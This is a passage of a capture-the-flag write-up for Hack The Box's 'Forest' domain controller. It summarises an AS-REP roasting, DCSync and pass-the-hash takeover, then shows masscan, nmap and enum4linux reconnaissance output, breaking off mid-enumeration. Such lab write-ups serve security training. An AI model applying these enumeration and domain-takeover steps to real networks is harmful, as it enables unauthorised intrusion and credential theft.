# [forest](https://app.hackthebox.com/machines/Forest)

> An Active Directory domain controller with a user account, `svc-alfresco`, that didn't require Kerberos pre-authentication and was thus ASREP-Roastable. Cracking its ASREP revealed the password `s3rvice`. Graphing out the domain's relationships with BloodHound revealed that `svc-alfresco` had `CanPSRemote` access to the machine, yielding the user flag. Further investigating the BloodHound graph revealed that `svc-alfresco` could had itself to the `Exchange Windows Permissions` group, which had `GenericAll` access to the domain `htb.local`. As a result, `svc-alfresco` was able to grant itself `DCSync` privileges for the domain and dump the domain's hashes. Passing the domain administrator's hash with `evil-winrm` yielded the root flag.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.248.171 --rate=1000 -e tun0 --output-format grepable --output-filename forest.masscan
$ cat forest.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49671,49676,49677,49681,49699,53,59077,593,5985,636,88,9389
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49671,49676,49677,49681,49699,53,59077,593,5985,636,88,9389 10.129.248.171 -oA forest
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-03 11:45 EDT
Nmap scan report for 10.129.248.171
Host is up (0.040s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-11-03 15:52:09Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49699/tcp open  msrpc        Microsoft Windows RPC
59077/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows 10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2021-11-03T15:53:06
|_  start_date: 2021-11-03T15:32:58
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-11-03T08:53:04-07:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.97 seconds
```

The machine appears to be an Active Directory domain controller on the domain with the FQDN `forest.htb.local`.

### UDP

```bash
$ nmap -sU 10.129.248.171
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-03 12:48 EDT
Nmap scan report for 10.129.248.171
Host is up (0.040s latency).
Not shown: 957 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 1419.55 seconds
```

---

## SMB Enumeration

```bash
$ enum4linux -a 10.129.248.171
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov  3 12:49:48 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.129.248.171
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================
|    Enumerating Workgroup/Domain on 10.129.248.171    |
 ======================================================
[E] Can't find workgroup/domain


 ==============================================
|    Nbtstat Information for 10.129.248.171    |
 ==============================================
Looking up status of 10.129.248.171
No reply from 10.129.248.171

 =======================================
|    Session Check on 10.129.248.171    |
 =======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.129.248.171 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name:

 =============================================
|    Getting domain SID for 10.129.248.171    |
 =============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ========================================
|    OS information on 10.129.248.171    |
 ========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.129.248.171 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.248.171 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ===============================
|    Users on 10.129.248.171    |
 ===============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 ===========================================
|    Share Enumeration on 10.129.248.171    |
 ===========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.129.248.171

 ======================================================
|    Password Policy Information for 10.129.248.171    |
 ======================================================


[+] Attaching to 10.129.248.171 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.248.171)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HTB
        [+] Builtin

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ================================
|    Groups on 10.129.248.171    |
 ================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Remote Management Users' (RID: 580) has member: Could not connect to server 10.129.248.171
Group 'Remote Management Users' (RID: 580) has member: The username or password was not correct.
Group 'Remote Management Users' (RID: 580) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Remote Desktop Users' (RID: 555) has member: Could not connect to server 10.129.248.171
Group 'Remote Desktop Users' (RID: 555) has member: The username or password was not correct.
Group 'Remote Desktop Users' (RID: 555) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Access Control Assistance Operators' (RID: 579) has member: Could not connect to server 10.129.248.171
Group 'Access Control Assistance Operators' (RID: 579) has member: The username or password was not correct.
Group 'Access Control Assistance Operators' (RID: 579) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Certificate Service DCOM Access' (RID: 574) has member: Could not connect to server 10.129.248.171
Group 'Certificate Service DCOM Access' (RID: 574) has member: The username or password was not correct.
Group 'Certificate Service DCOM Access' (RID: 574) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Incoming Forest Trust Builders' (RID: 557) has member: Could not connect to server 10.129.248.171
Group 'Incoming Forest Trust Builders' (RID: 557) has member: The username or password was not correct.
Group 'Incoming Forest Trust Builders' (RID: 557) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'RDS Management Servers' (RID: 577) has member: Could not connect to server 10.129.248.171
Group 'RDS Management Servers' (RID: 577) has member: The username or password was not correct.
Group 'RDS Management Servers' (RID: 577) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Distributed COM Users' (RID: 562) has member: Could not connect to server 10.129.248.171
Group 'Distributed COM Users' (RID: 562) has member: The username or password was not correct.
Group 'Distributed COM Users' (RID: 562) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Account Operators' (RID: 548) has member: Could not connect to server 10.129.248.171
Group 'Account Operators' (RID: 548) has member: The username or password was not correct.
Group 'Account Operators' (RID: 548) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Storage Replica Administrators' (RID: 582) has member: Could not connect to server 10.129.248.171
Group 'Storage Replica Administrators' (RID: 582) has member: The username or password was not correct.
Group 'Storage Replica Administrators' (RID: 582) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Replicator' (RID: 552) has member: Could not connect to server 10.129.248.171
Group 'Replicator' (RID: 552) has member: The username or password was not correct.
Group 'Replicator' (RID: 552) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Could not connect to server 10.129.248.171
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: The username or password was not correct.
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Users' (RID: 545) has member: Could not connect to server 10.129.248.171
Group 'Users' (RID: 545) has member: The username or password was not correct.
Group 'Users' (RID: 545) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Performance Log Users' (RID: 559) has member: Could not connect to server 10.129.248.171
Group 'Performance Log Users' (RID: 559) has member: The username or password was not correct.
Group 'Performance Log Users' (RID: 559) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'RDS Remote Access Servers' (RID: 575) has member: Could not connect to server 10.129.248.171
Group 'RDS Remote Access Servers' (RID: 575) has member: The username or password was not correct.
Group 'RDS Remote Access Servers' (RID: 575) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Guests' (RID: 546) has member: Could not connect to server 10.129.248.171
Group 'Guests' (RID: 546) has member: The username or password was not correct.
Group 'Guests' (RID: 546) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'System Managed Accounts Group' (RID: 581) has member: Could not connect to server 10.129.248.171
Group 'System Managed Accounts Group' (RID: 581) has member: The username or password was not correct.
Group 'System Managed Accounts Group' (RID: 581) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Backup Operators' (RID: 551) has member: Could not connect to server 10.129.248.171
Group 'Backup Operators' (RID: 551) has member: The username or password was not correct.
Group 'Backup Operators' (RID: 551) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Terminal Server License Servers' (RID: 561) has member: Could not connect to server 10.129.248.171
Group 'Terminal Server License Servers' (RID: 561) has member: The username or password was not correct.
Group 'Terminal Server License Servers' (RID: 561) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Administrators' (RID: 544) has member: Could not connect to server 10.129.248.171
Group 'Administrators' (RID: 544) has member: The username or password was not correct.
Group 'Administrators' (RID: 544) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'RDS Endpoint Servers' (RID: 576) has member: Could not connect to server 10.129.248.171
Group 'RDS Endpoint Servers' (RID: 576) has member: The username or password was not correct.
Group 'RDS Endpoint Servers' (RID: 576) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'IIS_IUSRS' (RID: 568) has member: Could not connect to server 10.129.248.171
Group 'IIS_IUSRS' (RID: 568) has member: The username or password was not correct.
Group 'IIS_IUSRS' (RID: 568) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Cryptographic Operators' (RID: 569) has member: Could not connect to server 10.129.248.171
Group 'Cryptographic Operators' (RID: 569) has member: The username or password was not correct.
Group 'Cryptographic Operators' (RID: 569) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Windows Authorization Access Group' (RID: 560) has member: Could not connect to server 10.129.248.171
Group 'Windows Authorization Access Group' (RID: 560) has member: The username or password was not correct.
Group 'Windows Authorization Access Group' (RID: 560) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Print Operators' (RID: 550) has member: Could not connect to server 10.129.248.171
Group 'Print Operators' (RID: 550) has member: The username or password was not correct.
Group 'Print Operators' (RID: 550) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Hyper-V Administrators' (RID: 578) has member: Could not connect to server 10.129.248.171
Group 'Hyper-V Administrators' (RID: 578) has member: The username or password was not correct.
Group 'Hyper-V Administrators' (RID: 578) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Server Operators' (RID: 549) has member: Could not connect to server 10.129.248.171
Group 'Server Operators' (RID: 549) has member: The username or password was not correct.
Group 'Server Operators' (RID: 549) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Network Configuration Operators' (RID: 556) has member: Could not connect to server 10.129.248.171
Group 'Network Configuration Operators' (RID: 556) has member: The username or password was not correct.
Group 'Network Configuration Operators' (RID: 556) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Performance Monitor Users' (RID: 558) has member: Could not connect to server 10.129.248.171
Group 'Performance Monitor Users' (RID: 558) has member: The username or password was not correct.
Group 'Performance Monitor Users' (RID: 558) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Event Log Readers' (RID: 573) has member: Could not connect to server 10.129.248.171
Group 'Event Log Readers' (RID: 573) has member: The username or password was not correct.
Group 'Event Log Readers' (RID: 573) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'DnsAdmins' (RID: 1101) has member: Could not connect to server 10.129.248.171
Group 'DnsAdmins' (RID: 1101) has member: The username or password was not correct.
Group 'DnsAdmins' (RID: 1101) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'RAS and IAS Servers' (RID: 553) has member: Could not connect to server 10.129.248.171
Group 'RAS and IAS Servers' (RID: 553) has member: The username or password was not correct.
Group 'RAS and IAS Servers' (RID: 553) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Cert Publishers' (RID: 517) has member: Could not connect to server 10.129.248.171
Group 'Cert Publishers' (RID: 517) has member: The username or password was not correct.
Group 'Cert Publishers' (RID: 517) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Allowed RODC Password Replication Group' (RID: 571) has member: Could not connect to server 10.129.248.171
Group 'Allowed RODC Password Replication Group' (RID: 571) has member: The username or password was not correct.
Group 'Allowed RODC Password Replication Group' (RID: 571) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Could not connect to server 10.129.248.171
Group 'Denied RODC Password Replication Group' (RID: 572) has member: The username or password was not correct.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Schema Admins' (RID: 518) has member: Could not connect to server 10.129.248.171
Group 'Schema Admins' (RID: 518) has member: The username or password was not correct.
Group 'Schema Admins' (RID: 518) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Key Admins' (RID: 526) has member: Could not connect to server 10.129.248.171
Group 'Key Admins' (RID: 526) has member: The username or password was not correct.
Group 'Key Admins' (RID: 526) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'View-Only Organization Management' (RID: 1106) has member: Could not connect to server 10.129.248.171
Group 'View-Only Organization Management' (RID: 1106) has member: The username or password was not correct.
Group 'View-Only Organization Management' (RID: 1106) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Enterprise Admins' (RID: 519) has member: Could not connect to server 10.129.248.171
Group 'Enterprise Admins' (RID: 519) has member: The username or password was not correct.
Group 'Enterprise Admins' (RID: 519) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Enterprise Key Admins' (RID: 527) has member: Could not connect to server 10.129.248.171
Group 'Enterprise Key Admins' (RID: 527) has member: The username or password was not correct.
